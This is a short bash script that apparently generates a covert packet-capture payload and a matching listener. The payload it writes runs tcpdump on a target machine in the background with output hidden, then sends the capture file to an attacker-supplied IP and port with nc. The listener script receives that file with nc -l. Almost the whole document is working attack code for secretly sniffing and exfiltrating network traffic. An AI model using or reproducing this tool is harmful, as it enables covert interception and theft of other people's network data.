#!/bin/bash
clear
read -p "enter your ip : " ip
#if [[ $tIp =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
#	break
#fi
read -p "enter the port for send file : " port
read -p "enter the captureData name (.sh): " name
read -p "enter the time for recive (Second) : " rTime
read -p "enter the name file saved in target : " tName
cat << EOF > ./$name
#!/bin/bash

        {
        timeout $rTime tcpdump -w  ./$tName
        nc -w 3 $ip $port < ./$tName
        } > /dev/null 2>&1 &
EOF

cat << EOF > ./listener.sh
#!/bin/bash
        nc  -l -p $port > capture.pcap
EOF


